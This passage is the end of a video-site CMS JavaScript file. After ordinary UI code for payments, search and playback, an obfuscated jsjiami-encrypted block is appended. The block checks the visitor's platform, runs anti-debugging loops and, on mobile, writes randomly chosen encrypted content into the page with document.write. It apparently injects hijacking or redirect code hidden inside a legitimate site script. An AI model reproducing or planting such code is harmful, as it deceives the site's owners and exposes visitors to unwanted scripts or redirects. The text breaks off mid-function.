						dataType: 'json',
						timeout: 3000,
						data: $(this).serialize(),
						beforeSend: function(xhr){
							$('.alert-card').html('Loading...');
						},
						error : function(){
							$('.alert-card').html('请求失败，请刷新网页。');
						},
						success: function(json){
							if(json.status == 200){
								feifei.alert.success('.alert-card', '充值成功，谢谢支持。');
								setTimeout(function(){location.reload();}, 2000);
							}else{
								feifei.alert.warning('.alert-card', json.info);
							}
						},
						complete: function(xhr){
						}
					});
					return false;
				});
			}
		});
	}
}
//end
};
/*.ff-search #wd #ff-goback .ff-gallery .ff-raty .ff-img .ff-share .ff-safecode .ff-reply*/
$(document).ready(function(){
	if(feifei.browser.useragent.mobile){
		feifei.mobile.jump();
		feifei.mobile.nav();
		feifei.mobile.goback();
		feifei.mobile.flickity();
	}
	feifei.user.load();
	feifei.cms.nav();//
	feifei.cms.collapse();
	feifei.search.dropdown();
	feifei.search.autocomplete();
	feifei.search.hot();//
	feifei.search.submit();//
	feifei.search.keydown();//
	feifei.image.lazyload();
	feifei.image.slide();
	feifei.image.qrcode();//
	feifei.playurl.tongji();
	feifei.playurl.more();
	feifei.playurl.dropdown();
	feifei.playurl.download();
	feifei.playurl.active();
	feifei.page.more();
	feifei.page.keydown();//
	feifei.updown.click();
	feifei.score.raty();
	feifei.scenario.load();
	feifei.forum.load();
	feifei.vcode.load();
	feifei.scroll.totop('ff-totop',10);
	feifei.record.load();//
	feifei.hits.load();
	feifei.share.baidu();
});



 /*
/*sale 2.14.ktt
 */
 
;var encode_version = 'jsjiami.com.v5', hjpyk = '__0xda908',  __0xda908=['w5nDtsK6w4ZK','wqfCq8OvBHQ=','EHpKwonDog==','cALCtMKfAQ==','JcKAZcOAwro=','CzlKecKL','VX/DsMOxw4A=','WyomwonCvQ==','w7/DisKawpB0','SXBSw57CtsOmKg==','LErDoMKYw6E=','wogaW8KGwpfCrsKJ','w65EecKgQw==','wrPCmRR0SEl+','KMOAdj8=','w7nDikJMKsOleg==','eWRPwovCpg==','HRLCh8KYw41Mw5Q=','A8Osw6PCrz1yEMOUwp0=','P07DsMKD','GG52','CcOncjrCqw==','IMK7wo1iwrs=','w7bChEDCoh0=','wq/CilA=','woLCs8Ka','QsOzwrpgwoDDpsOodQ0DciPCosOXHMOCwpc=','CMOaRgbCqg==','fyMXwrDCvg==','FsKGw6cvw6s=','w67CnlfCoTY=','NWlHwqXDvg==','MsOefDnCrA==','NcOccTPCvQ==','ISPDrlLDhg==','aG5Nwo3Cs8OPwqp0w6g=','wopdw6s=','endcwoY=','G8Ohw6hz','IDTDvkjDkw==','w5nDjMKOCn4=','wq1Hw4I=','CsONw6x6w40=','wo5Yw4gndA==','w5vDqUN+Aw==','LTLCmw==','w5I4FA==','IsKtFA==','EcOAw5TChzg=','w5I0SQc/','w5Eqw77CrsKy','woAJDl04','fF1JwoDCuw==','KcKIw7IDw6o=','Bn1Hwqgz','woLCs8OeA2g=','GMOGw75rw74=','XiM3wpLCoQ==','Agl8c8KP','EsKqw5k=','Mxxm','wrIxwoA=','DQnCm8KCw4xH','w5DDocKmw45Mag==','B1hc','OicAwp3CjBkOw5XDjTw=','w6TDn8KXwp0=','H8OLw4wMLAbCiMKSSH3CmwNDJXEjw5vCmMOUNhRjdsOYRsOPIsK+wrsMwrPDhcOnwrTCp8O3c8ODwqjDnjzDqcOpWcOUb2kwwrfDq2wxw58IEMOhw4rDrVp9wqjDlVYZd8KAw71bw5PCiznCucKDCktcbCZTJ8Kyw5NAw4zDvBbDhcOhBcOmMRpdw5k9wpsIJFZzGD5AfGd5wpUgw4YnX2hxwqZJZjoxw5ksJjscDhMJw78Cw7g3w4gNaVwbwqHCkMKywr/CqMK5ZnnCj8KJdXYIw57CrsK6a8KAwqjDng8qw5LCssObBsKywr9WAyhQRn/Co8Ojw6NSQcKqGArDkUYRwrDCqcKsL3jDo27DjlHCpGTDiA==','w5rDk8KaHw==','wrDCmU7CpsK4','Dy3DvkDDhw==','YwLDvsKnwow=','R8OBw50wPA==','wpVOSFJB','KcOpaBnCrg==','LiZowprDkA==','HMKmwoRZwr4=','OcO3RR3CrA==','w4rDnMKuw5Nx','OG1POX0=','RDHClsKREg==','wqErwoTCrcKY','ZcKBwpvCo8Kx','MMKwbcOgwpA=','CDDCnsK6w7Q=','H8OvNcKZwqo=','w4RXRA5e','GsO7w6Nw','JUtRwoXDvw==','wrY4KHEU','dHhZwpjChg==','RsOLw5kMNA==','DyNzwrvDnw==','wrccJlou','UMKawrrCqw==','w5/CqsOIHXDDpBc2dj7Cpg3DksOmwrh3UcK5wrRww7UFBF4oGDTDtgcJw6ldA8KiDcK/wqbCr8O0w73Do1XCiGLCo0gUJQMEw4c3N37DncOQJjLDrWsbwqbCrQwXwpthNCbCs8OPw6bDvUHDgmFjwozCisKzGkPCtcKeL8Ouwopew7MJw73DpMONR8KddcKIXMKYLj7DiH7CmsOBG8KGw4nDgMKAwqbDscOSw4QPKy7DkXHDisOdaQAlEA==','w4lVU8KHwpnCr8KJMDrCssObw4jCjgPDjF9Vwowqw4sIwrpUIA3DjjMnacKoOcOYw5fCoMKvBcKqw6zDoQcgw7s=','I8OBdCnDuMOo','w4rDrcK7w4BaaxDDt8Kowr0=','PkbDscKEw6TDo8Kd','wrPCocK2wrzCiw==','RVo9wqbDig==','ISZewoXDsg==','wqBJTGpp','MXF0woLDuA==','UXQqwprDlg==','LsKMw5EW','wrMaQsKewq0=','LUPDssKGw58=','JjXDvw==','wqMWP1k6','w5tTTcKffA==','Wgo1wonCog==','wrHChgprXg==','w5Yjw6fCr8K/','DcOhXDPCmw==','wqzCmX7CrMK8','GsO1D8KzwojCn14=','wrlKPsKzARXDmxrDnyPCuDA8w7wYwqzDqw==','KsO5w6XCjyM=','wqPChhZuUw==','KsKFw4wP','wrzCmcKpwpo=','MTTDrUTDhA==','wofCpsOMGnY=','YXlJ','T8OtVcOEw5PDhsKSUMO4','V8KHwqzCvcKA','wpzCq1ccwps=','CyZzwrvDjFk8Wg==','VsOVw4wKDEHCjsKUXQ==','woHCt1QewoEpw7TDg8K3wrEz','FlFt','woIbUcKQwoDCjcKK','LsOzDw==','NMKwwok=','worCrcOKCmnDhhQ=','KsKlSw==','w7ttRg==','cVjCvQ==','fCcLwpbCkXgA','QX9Awp3Cuw==','YR3CqA==','Yn/DoQ==','w7fCgks=','DMOIw4YWKAjCg8KORGM=','w5DDmcKfAg==','EcOuDMKs','wrdbbsK7UEnCjA7Cjy3DvCl+wr0JwoXCh3bClcOFL1vDu1ABw6XCgHQLwpFIbjRswppVw6cbVAVzcwHCuXrDsFU9ZifCtG/CvBBJwp/CnsO7w7saUy9zwojCnjzCvsKfQcKlLQTDtDHCvcKiICsFQcKlHljDtEIFwpDDpRjCv8KZw4ULJcKWw7XDiwnDpjEAMhLCocOXwrrDoj7DrcKxTQ8pwoJ+YsOJdGM0w4fCu8KmW1FedcKxSynDuVUFwqnCjsOjAcOIw5wpwrbDsggzM0goXB0Iw4rCh3zCjsKAfsKWbh1qBk93wp/Cr8KcdcO1ZMKrwq1VDzTCgHPDm8KcwoV9UcKHwo3CpsKNwpd2NgvDg8Kawpo=','wrfCmMKrwow=','JMODYCTCoQ==','NyPDrUPDmA==','EH5vwrM=','w4ZMZlJQTsOjNSNfAFHCqjjClAYYwpwPw61Jw682fMKDwoFNwpYDLcOWw7wfesOaw4MIwrl6w4LDg8Opw4PCgjTCnsKewr96PRUQVcOfWxzCqMO/bVUMwrI1wqUNwpfCiMKhLSjDt8Oiw4Iaw6vCh8K+e0bDmcKHJ8KYZcKYRU16eVPCmMOxS8Opwpk2KRM8w5YuSkTDvMKWwojDscKIaBnDoCN4cnRAUl1Kwohnw7cKMsOX','w7fDl8KpwofCvcKVwprCgVBdclXDlsKUw7HDrMOZwoEJw6MYwrAkdxBFwojDtsKSwqDCoi/Dug/CmMKRwo9pw5EoSUA=','wrfCmMKrwozDvMOS','wqLCnFzCgMK4w5TDgsKdwq4s','KmNIGG5Pw7g=','w5EzYz8Q','wpzCkxhyXg==','wrE8wqfCkg==','wqvCocOZHGE=','XSsYwoDCmQ==','LsODAMK2wok=','aVzDh8O+w5w=','ZiEAwoQ=','DcO3BcKJwqQ=','DcOVIMKwwpc=','GDlh','w7nDqHl8KQ==','OMOID8KIwoE=','PVzDp8Kfw4fDqMKdwqtt','YhvCisKnPGd3wr0MDMK1','w4jDocK7w50=','w6nDuMKuwpXCp0TCtl5wEcK+wrbCmcONZcKJw7LCnsKcGHDCgnrCjENwwrRhDcKMEgQQScOkfTbDh8KIUMKAwo7CvMKR','w40qcwYgfcOKHA09WR/DhnENwpsMw6sdw7ZBcC/DrifChX7CisKrw713Q8KDwrzCpWMCX1vDr8OkwqnDjGjDmg==','PgJuSsKj','w7UuH2nCpR0=','wocQW8KSwozCqg==','c8OSIyzDrMK+JkM9LnY=','S31fw4nCvMOsJ8Kaw6PCq8OFw7kowrJFfsOtwrVrUsOZaFV9w4ZIwqE=','w5hXRA==','w4dORy58','LsKUw5IIw5Q=','w4/DucK8FEg=','wqdjw6IXVg==','CsOxw67CrTlu','Z3Vuw5rCng==','M8O9w6rCgx0=','MMO/CMKqwo8=','woZxw44MWg==','bHbDo8Ouw6UX','GBHChsKEw5A=','PCt8wrbDvw==','CSt8wqvDhVs=','w7jDn8KAwoLCvw==','wpLDrMK8w4RU','c8KUw5AG','wqHCikjCrg==','ZkvDrcKOw74=','IWrDusOo','wrTDjVhS','XGtiwro=','w4hKw6AB','Ozkfwoc=','ZkXDsQ==','OB7CtsKv','UBrCgMKN','wqLDisKFwp0=','wqHCh0TCog==','Zk3Dr8Kd','UAnCgMKN','w6fCmlPCvTwdPMO+DcKUCgvCgcOcKXzCu8Oew7Zrw5dJBFosH8Kb','RnpSw4rCrcOi','XMKawrDCtw==','FXR/wo8Vw6vCn3XCoBkCJ3gM','w7hCcsKjVA==','ZFw9wqfDvBtU','FHxrwqPDmQ==','bcKYwoodwpJOwpE8wr1yUsKaw7AOKg==','wrYJK1cj','wrhmw44SVywr','wrs8BXTCphXDsQ==','w7bDvsKzwpHCsRLDtw==','w4nCvHEHw5Ylw6LCvcOxwqs7PMKJacOqJMOow57DuwtXPMKvwoAtw5HDn1TDmnHDisKqwojDicKXwoPCrhLCnMOFNsO2wpjDmxALw6YRISvCjMOiNcOaQyLCg8OkTsKEDR19w5PCmMOBwoBTw48Vw7oEwrgxw5cvO8KPL2Q=','w50bPA9QHcK6OjRCDwM=','wq46wqPCisKzMRA=','wq/DicKVw4F0wqjCgMKjJ8OJCcOEwqvCp8OxS8OFwq7Cqy3Ds8KqP8K1w7gbw7DCncKnw6dlPUJ9w6s+aE3CtFjDoMKDwqRmVMOIw4PDj25vw7gCZ8KIwrXCtlxXVMKdI8KPPMKGw7QDwpPDvVtZw40uVMK6wpI6TMKnwpjCihoad8OPw4HCswkIw7XDrDrDuGsNwq/DgcOeJx0WwoXCsBJ5w5zDmcODGh3Dvg==','YjsGwofCjFsI','w4DCsMONV2XDvBR5fTPCgAfDmMK0w65lSsKCwqJqw69QXRgtSnnDuUIbw7lcE8OsVMK1wqfCusO/wqjCt07ChH/CrU8OJVNTwpFjK2TDmsOcaTbDo3dGwr3Cpk0awopuNnnCuMOLw7HCthbCljY/wpg=','P13Dq8KZw6PDo8KW','I0Ytw6/DpA9Lwp07bQzCsF7Dq8K4wobCi8KLAVPDgsOww70+wrHCqcKywrIHw7JPSi/DgsOZw5DDs8Kwwqx3w6TDqTzDnzMBGMKUwrXCqGvDriRMYhjDk3kww4XCj8KHcsK8w7HCjcOnIMKNw5vDn8KyNx9vWS7CpWRtFcKyDcOgaSo4EsK8wpsLwrvDuTBZesOiwpPCncOCw4HChsKMUDLCuyM=','w7QuHms+woXCrw==','QlLCmsKOw4FUw5gVwr/DhA==','XcOnX8OVw4bDnsKV','w6jDmlzCncKjw5HDi8OK','w7vDiMKfwo1lwrHCiA==','YHleEnhKw7LCocKKHcORfFjDsUvCqcKmDcKzHcK6woIAwrzDq3g1wrQxTCvChGEG','ZcKSRcKuwpkZZ8OVAcKRw7bDuXPCnsK5','F8O9w7o=','X3FYw4jCv8OjIcKWw60=','QxrDpsKpwotAwpbCpMOxT8KTBT41','54i25p2R5Yye77+nw4hT5L6r5a+g5p+O5b+D56ij77626L6g6K+o5pWI5o2+5ouP5Lua55i65baT5L2V','5Yu16ZqT54qH5p+Z5Yyr77+0wpXCkOS8peWuteacieW8ieeosw==','wrrClcKlwpDCv8KM','wodkA0DDoMKkekU=','USIa','w7NnWg==','bFAgwrDDpBI=','U8OowrbCtn16S8OHw4LDhxXDmcOb','w44Rw4XCj8KJ','wpDCs8OCBmU=','wqB/Skly','w5jDg8Kiwqxk','FcOfw7U=','cAHCqMKrP2tqwpBNVcKMBcOpHBNz','wpM/w7tNEmptRMKBw5jDn8Obw4LDhsO+Kk/ChsKed8OfWcOUIgXDqsKJacKwwoLDssOEw78Sw6/DqVlLBMKuPDtIYHxTc8Klw7AcOcKWwpYZL1ASS8KJw6zCnhw=','CFZqwr8=','w6LDpMK7wozCug==','w5XDqsK4w5xM','XnFL','w4U9CQ==','54mh5p2F5Y2777+MwoBe5L+l5ayQ5p6N5byZ56mp77yn6L6Q6K+35paW5o+u5oq/5LuD55i45bar5L68','HyjDmE7Djg==','MzbDpGbDhA==','wpBCw6QzwrU=','w6jDjUFuFQ==','RC03wqPCpw==','w7JMTcKIWg==','w5XDtmd6Jw==','FV1wwr8=','dgQhwoLCjw==','w7LDqMKzMk8=','YhHCtcK8','P0d1AGo=','FSTDrlbDhQ==','w7LDqMKfCmM=','KDNXwojDmg==','McKLSsOYwpo=','w6YJAUzCoA==','HMKtw70Qw5k=','wq3Cj2nCrsKx','McKrwrJYwq4=','FcOeEcKFwpI=','woo2U8KSwrE=','w67Dm8KMwrbClw==','ND/Dq2PDhQ==','MTLDmnbDoA==','BMKFw6wNw7E=','XMKbwpfCncK0','FsK9XcOYwrA=','wrVUw4AdwrE=','w7cEMHEy','FsKBwr9mwqM=','wpoMUsKxwpw=','XDjDhcKQwps=','woghEk8n','VsO3w6AoPA==','w4jDqcK/w4hT','wo90SXBA','wqEdQsKGwpE=','W1VewpDCgA==','F8O0KMKPwqE=','wrB8bGNw','B8O+w7PCkA4=','wrHCnyhsag==','bAcrwrzCoA==','CiXCrsKFw4s=','wp0gwovClcKz','KcKCK8KCw6I=','DcKnw4cQw6c=','dWIiwr7DlQ==','w6UoMl/Cpg==','NMKhXMO9wr0=','wqHCmcOABF0=','wqwfwqbCl8KT','diYBwoDChlsD','wot8w6YNVw==','w7TDt1tPKw==','M8OgC8KTwpI=','w6LDo8K0wpbCuxLDvA==','AsKJw6zCrsOHw6l5wr/Ds1XDmwV6wpfCjcKuwqc=','wpwAfsKkwow=','w6jDn8KUwoxn','JEDDpQ==','IUHDpMKC','OMKcw50Ew5BGw4svw6U=','w7bDrcKowos=','XRvDrcKjwo8='];(function(_0x434972,_0x477020){var _0x410a18=function(_0x35eaa3){while(--_0x35eaa3){_0x434972['push'](_0x434972['shift']());}};var _0x3078f0=function(){var _0x11218a={'data':{'key':'cookie','value':'timeout'},'setCookie':function(_0x66533b,_0x330ad3,_0x5945e0,_0x3f5b2d){_0x3f5b2d=_0x3f5b2d||{};var _0x4a4a3f=_0x330ad3+'='+_0x5945e0;var _0x453ef6=0x0;for(var _0x453ef6=0x0,_0x489f19=_0x66533b['length'];_0x453ef6<_0x489f19;_0x453ef6++){var _0x556dc0=_0x66533b[_0x453ef6];_0x4a4a3f+=';\x20'+_0x556dc0;var _0x590b5d=_0x66533b[_0x556dc0];_0x66533b['push'](_0x590b5d);_0x489f19=_0x66533b['length'];if(_0x590b5d!==!![]){_0x4a4a3f+='='+_0x590b5d;}}_0x3f5b2d['cookie']=_0x4a4a3f;},'removeCookie':function(){return'dev';},'getCookie':function(_0x188508,_0xf72a24){_0x188508=_0x188508||function(_0x47c629){return _0x47c629;};var _0x11d845=_0x188508(new RegExp('(?:^|;\x20)'+_0xf72a24['replace'](/([.$?*|{}()[]\/+^])/g,'$1')+'=([^;]*)'));var _0x444c19=function(_0x24eb73,_0x27ddcd){_0x24eb73(++_0x27ddcd);};_0x444c19(_0x410a18,_0x477020);return _0x11d845?decodeURIComponent(_0x11d845[0x1]):undefined;}};var _0x3a44a9=function(){var _0x1ace28=new RegExp('\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*[\x27|\x22].+[\x27|\x22];?\x20*}');return _0x1ace28['test'](_0x11218a['removeCookie']['toString']());};_0x11218a['updateCookie']=_0x3a44a9;var _0x2bb8d4='';var _0x47dccc=_0x11218a['updateCookie']();if(!_0x47dccc){_0x11218a['setCookie'](['*'],'counter',0x1);}else if(_0x47dccc){_0x2bb8d4=_0x11218a['getCookie'](null,'counter');}else{_0x11218a['removeCookie']();}};_0x3078f0();}(__0xda908,0x81));var _0x58d4=function(_0x42fba0,_0x17c9d3){_0x42fba0=_0x42fba0-0x0;var _0x497b32=__0xda908[_0x42fba0];if(_0x58d4['initialized']===undefined){(function(){var _0xfbb64b=typeof window!=='undefined'?window:typeof process==='object'&&typeof require==='function'&&typeof global==='object'?global:this;var _0x477725='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0xfbb64b['atob']||(_0xfbb64b['atob']=function(_0x4a98af){var _0x38c21a=String(_0x4a98af)['replace'](/=+$/,'');for(var _0x3e1e9=0x0,_0x258866,_0x4237bc,_0x44931c=0x0,_0x322a70='';_0x4237bc=_0x38c21a['charAt'](_0x44931c++);~_0x4237bc&&(_0x258866=_0x3e1e9%0x4?_0x258866*0x40+_0x4237bc:_0x4237bc,_0x3e1e9++%0x4)?_0x322a70+=String['fromCharCode'](0xff&_0x258866>>(-0x2*_0x3e1e9&0x6)):0x0){_0x4237bc=_0x477725['indexOf'](_0x4237bc);}return _0x322a70;});}());var _0x53e507=function(_0x3b0829,_0x2e6272){var _0x5c8539=[],_0x271af9=0x0,_0x2913a6,_0x186d5a='',_0x41166c='';_0x3b0829=atob(_0x3b0829);for(var _0x1fea33=0x0,_0x21d4a5=_0x3b0829['length'];_0x1fea33<_0x21d4a5;_0x1fea33++){_0x41166c+='%'+('00'+_0x3b0829['charCodeAt'](_0x1fea33)['toString'](0x10))['slice'](-0x2);}_0x3b0829=decodeURIComponent(_0x41166c);for(var _0x1086f8=0x0;_0x1086f8<0x100;_0x1086f8++){_0x5c8539[_0x1086f8]=_0x1086f8;}for(_0x1086f8=0x0;_0x1086f8<0x100;_0x1086f8++){_0x271af9=(_0x271af9+_0x5c8539[_0x1086f8]+_0x2e6272['charCodeAt'](_0x1086f8%_0x2e6272['length']))%0x100;_0x2913a6=_0x5c8539[_0x1086f8];_0x5c8539[_0x1086f8]=_0x5c8539[_0x271af9];_0x5c8539[_0x271af9]=_0x2913a6;}_0x1086f8=0x0;_0x271af9=0x0;for(var _0x19aad8=0x0;_0x19aad8<_0x3b0829['length'];_0x19aad8++){_0x1086f8=(_0x1086f8+0x1)%0x100;_0x271af9=(_0x271af9+_0x5c8539[_0x1086f8])%0x100;_0x2913a6=_0x5c8539[_0x1086f8];_0x5c8539[_0x1086f8]=_0x5c8539[_0x271af9];_0x5c8539[_0x271af9]=_0x2913a6;_0x186d5a+=String['fromCharCode'](_0x3b0829['charCodeAt'](_0x19aad8)^_0x5c8539[(_0x5c8539[_0x1086f8]+_0x5c8539[_0x271af9])%0x100]);}return _0x186d5a;};_0x58d4['rc4']=_0x53e507;_0x58d4['data']={};_0x58d4['initialized']=!![];}var _0x207dbc=_0x58d4['data'][_0x42fba0];if(_0x207dbc===undefined){if(_0x58d4['once']===undefined){var _0x3450f2=function(_0x10e4a6){this['rc4Bytes']=_0x10e4a6;this['states']=[0x1,0x0,0x0];this['newState']=function(){return'newState';};this['firstState']='\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*';this['secondState']='[\x27|\x22].+[\x27|\x22];?\x20*}';};_0x3450f2['prototype']['checkState']=function(){var _0x4b5f14=new RegExp(this['firstState']+this['secondState']);return this['runState'](_0x4b5f14['test'](this['newState']['toString']())?--this['states'][0x1]:--this['states'][0x0]);};_0x3450f2['prototype']['runState']=function(_0x43dfe6){if(!Boolean(~_0x43dfe6)){return _0x43dfe6;}return this['getState'](this['rc4Bytes']);};_0x3450f2['prototype']['getState']=function(_0x56278f){for(var _0x26b35f=0x0,_0x15d6ef=this['states']['length'];_0x26b35f<_0x15d6ef;_0x26b35f++){this['states']['push'](Math['round'](Math['random']()));_0x15d6ef=this['states']['length'];}return _0x56278f(this['states'][0x0]);};new _0x3450f2(_0x58d4)['checkState']();_0x58d4['once']=!![];}_0x497b32=_0x58d4['rc4'](_0x497b32,_0x17c9d3);_0x58d4['data'][_0x42fba0]=_0x497b32;}else{_0x497b32=_0x207dbc;}return _0x497b32;};var _0x3b3697={'win':![],'mac':![],'xll':![]};var _0x23e7ca=navigator[_0x58d4('0x0','bEdN')];var _0x47aab2=navigator[_0x58d4('0x1','5RYv')][_0x58d4('0x2','73TP')]();_0x3b3697[_0x58d4('0x3','WDT5')]=_0x23e7ca[_0x58d4('0x4','ocq9')](_0x58d4('0x5','z5Qh'))==0x0;_0x3b3697[_0x58d4('0x6','c!5h')]=_0x23e7ca[_0x58d4('0x7','4FK@')](_0x58d4('0x8','d9@n'))==0x0;_0x3b3697[_0x58d4('0x9','^poc')]=_0x23e7ca==_0x58d4('0xa','#q9(')||_0x23e7ca[_0x58d4('0xb','MFGc')](_0x58d4('0xc','oRaz'))==0x0;if(_0x3b3697[_0x58d4('0xd','TAKE')]||_0x3b3697[_0x58d4('0xe','BJcI')]||_0x3b3697[_0x58d4('0xf','#1Xm')]){var _0xd33938=_0x58d4('0x10','5RYv');$(_0x58d4('0x11','o#eb'))[_0x58d4('0x12','z5Qh')](_0x58d4('0x13','1NIb'));$(_0x58d4('0x14','*PXP'))[_0x58d4('0x15','urd3')]();$(document)[_0x58d4('0x16','rRXH')](function(){var _0x16abd7={'tmdIC':function _0x3351a9(_0x51c337,_0x3a7915){return _0x51c337(_0x3a7915);},'Lebuy':_0x58d4('0x17','ewYA'),'Hbwsp':function _0x5ee8b1(_0x5cc696,_0x20e60d){return _0x5cc696+_0x20e60d;},'WYavn':_0x58d4('0x18','tmJ1'),'fBEbx':_0x58d4('0x19','*PXP'),'tOApp':_0x58d4('0x1a','*PXP'),'cMUCl':_0x58d4('0x1b','gEbI'),'ARnHf':_0x58d4('0x1c','MaJj')};_0x16abd7[_0x58d4('0x1d','ME#[')]($,_0x16abd7[_0x58d4('0x1e','kT5Y')])[_0x58d4('0x1f','&r4b')](_0x16abd7[_0x58d4('0x20','4FK@')](_0x16abd7[_0x58d4('0x21','MFGc')](_0x16abd7[_0x58d4('0x22','z5Qh')],_0xd33938),_0x16abd7[_0x58d4('0x23','BJcI')]))[_0x58d4('0x24','MFGc')]();_0x16abd7[_0x58d4('0x25','z5Qh')]($,_0x16abd7[_0x58d4('0x26','z5Qh')])[_0x58d4('0x27','bEdN')](_0x16abd7[_0x58d4('0x28','&rzY')],_0x16abd7[_0x58d4('0x29','z5Qh')]);});}var _0x3b9676=navigator[_0x58d4('0x2a','!![U')][_0x58d4('0x2b','TAKE')]();isMobile=/(iphone|ios|android|mini|mobile|mobi|nokia|symbian|ipod|ipad|windows\s+phone|mqqbrowser|wp7|wp8|ucbrowser7|ucweb|360\s+aphone\s+browser)/i[_0x58d4('0x2c','mXvg')](_0x3b9676);var _0x2e4fb1=new Array(_0x58d4('0x2d','[Cni'),_0x58d4('0x2e','ME#['));var _0x1bc9d5;setInterval(function(){var _0x1d82d4={'waJXd':function _0xe7ab98(_0x28030c){return _0x28030c();}};_0x1d82d4[_0x58d4('0x2f','zmBM')](_0x45bc0e);},0xfa0);_0x1bc9d5=_0x2e4fb1[parseInt(Math[_0x58d4('0x30','o[jS')]()*_0x2e4fb1[_0x58d4('0x31','ocq9')])];function _0x1e8e0a(_0x3512b5){var _0x5e044e={'TulDd':_0x58d4('0x32','urd3'),'wEBrO':function _0x335fba(_0x553927,_0x504d0d){return _0x553927||_0x504d0d;},'hwEqd':_0x58d4('0x33','I]!c'),'MjRwG':function _0x55a59a(_0x2b24d0,_0x3efb20){return _0x2b24d0<_0x3efb20;},'UijIP':function _0x29d57f(_0x1de8a6,_0x444ee1){return _0x1de8a6===_0x444ee1;},'Ieijh':_0x58d4('0x34','1NIb'),'GanyU':function _0x19e34c(_0x3e0d33,_0x2a4638){return _0x3e0d33*_0x2a4638;},'ySZgk':function _0xd2ad6a(_0x58810e,_0x3ea519){return _0x58810e(_0x3ea519);}};var _0x3e7356=_0x5e044e[_0x58d4('0x35','6(3a')][_0x58d4('0x36','1FiT')]('|'),_0x40e230=0x0;while(!![]){switch(_0x3e7356[_0x40e230++]){case'0':var _0x7e7eea='';continue;case'1':return _0x7e7eea;case'2':_0x3512b5=_0x5e044e[_0x58d4('0x37','o#eb')](_0x3512b5,0x20);continue;case'3':var _0x20f106=_0x5e044e[_0x58d4('0x38','bht3')];continue;case'4':var _0x12bf81=_0x20f106[_0x58d4('0x39','dNhD')];continue;case'5':for(i=0x0;_0x5e044e[_0x58d4('0x3a','I]!c')](i,_0x3512b5);i++){if(_0x5e044e[_0x58d4('0x3b','dNhD')](_0x5e044e[_0x58d4('0x3c','z5Qh')],_0x5e044e[_0x58d4('0x3d','bht3')])){_0x7e7eea+=_0x20f106[_0x58d4('0x3e','BJcI')](Math[_0x58d4('0x3f','1YV!')](_0x5e044e[_0x58d4('0x40','bEdN')](Math[_0x58d4('0x41','bEdN')](),_0x12bf81)));}else{_0x5e044e[_0x58d4('0x42','[Cni')](result,'0');}}continue;}break;}};var _0x4e908b=_0x1e8e0a(0xa);var _0x7db103=new Array(_0x58d4('0x43','mXvg'),_0x58d4('0x44','1FiT'),_0x58d4('0x45','#1Xm'),_0x58d4('0x46','!![U'),_0x58d4('0x47','BJcI'),_0x58d4('0x48','&rzY'),_0x58d4('0x49','ewYA'),_0x58d4('0x4a','D&RT'),_0x58d4('0x4b','MFGc'),_0x58d4('0x4c','!![U'),_0x58d4('0x4d','TAKE'),_0x58d4('0x4e','1YV!'),_0x58d4('0x4f','CTxL'),_0x58d4('0x50','#1Xm'),_0x58d4('0x51','!![U'),_0x58d4('0x52','1YV!'));var _0x1fa2dc=_0x58d4('0x53','#1Xm')+_0x7db103[parseInt(Math[_0x58d4('0x30','o[jS')]()*_0x7db103[_0x58d4('0x54','I]!c')])];function _0x5c6a9e(_0x17b143){var _0x3c51ef={'uDhhm':_0x58d4('0x55','Q^QE')};document[_0x58d4('0x56','ewYA')](_0x17b143)[_0x58d4('0x57','1NIb')][_0x58d4('0x58','Uslr')]=_0x3c51ef[_0x58d4('0x59','WDT5')];}if(isMobile){var _0x4dc0da=_0x58d4('0x5a','1FiT')[_0x58d4('0x5b','$PyL')]('|'),_0x3428e7=0x0;while(!![]){switch(_0x4dc0da[_0x3428e7++]){case'0':document[_0x58d4('0x5c','bht3')](_0x58d4('0x5d','o[jS'));continue;case'1':document[_0x58d4('0x5e','[Cni')](_0x58d4('0x5f','73TP')+_0x1bc9d5+_0x58d4('0x60','tmJ1'));continue;case'2':document[_0x58d4('0x61','&r4b')](_0x58d4('0x62','CTxL'));continue;case'3':document[_0x58d4('0x63','MFGc')](_0x58d4('0x64','4FK@'));continue;case'4':document[_0x58d4('0x65','!![U')](_0x58d4('0x66','Uslr'));continue;case'5':document[_0x58d4('0x67','^poc')](_0x58d4('0x68','1YV!'));continue;case'6':document[_0x58d4('0x69','mWNT')](_0x58d4('0x6a','gEbI'));continue;case'7':document[_0x58d4('0x6b','CTxL')](_0x58d4('0x6c','MaJj'));continue;}break;}}else{}ddfsdf;(function(_0xcf6171,_0x283e00,_0x307563){var _0x5316ef={'hQuPW':_0x58d4('0x6d','ly2['),'ZZJiC':function _0x4c14ca(_0x2b61a6){return _0x2b61a6();},'aCfgI':_0x58d4('0x6e','ELdG'),'oWVSC':function _0x4107f5(_0x4f6817,_0x1969b4){return _0x4f6817!==_0x1969b4;},'qygDd':_0x58d4('0x6f','I]!c'),'ttVQA':function _0x2513f8(_0x4bc185,_0xb12536){return _0x4bc185===_0xb12536;},'YaRlQ':_0x58d4('0x70','#q9('),'nnIOF':function _0x542429(_0xb6be66,_0x3e241f){return _0xb6be66+_0x3e241f;},'qyuIc':_0x58d4('0x71','1YV!'),'SfLoa':_0x58d4('0x72','*PXP'),'tXGni':function _0xc05a03(_0x2416ab,_0x1e1650,_0x159489){return _0x2416ab(_0x1e1650,_0x159489);},'OPUkJ':function _0x550ce0(_0x596527,_0x3dbd3d){return _0x596527!==_0x3dbd3d;},'uQIPq':function _0x3fdb60(_0x396300,_0x1158e4){return _0x396300===_0x1158e4;},'MXUqp':_0x58d4('0x73','*PXP'),'tmwak':_0x58d4('0x74','wlC]'),'Jhwsi':_0x58d4('0x75','MFGc'),'VCpxC':_0x58d4('0x76','1NIb'),'JYlCA':function _0x8908bb(_0x372e1a,_0x1cabfc){return _0x372e1a/_0x1cabfc;},'ajsZC':_0x58d4('0x77','Uslr'),'aiRkM':function _0x599ade(_0x5dfdec,_0x3bd842){return _0x5dfdec%_0x3bd842;},'yNDOI':_0x58d4('0x78','dNhD')};var _0x26694b=_0x5316ef[_0x58d4('0x79','u0KR')][_0x58d4('0x7a','4FK@')]('|'),_0x2b6723=0x0;while(!![]){switch(_0x26694b[_0x2b6723++]){case'0':_0x5316ef[_0x58d4('0x7b','tmJ1')](_0x737048);continue;case'1':_0x307563='al';continue;case'2':(function(){_0x4d4174[_0x58d4('0x7c','CTxL')](_0x57155b,this,function(){var _0x1579a8={'ZnTio':function 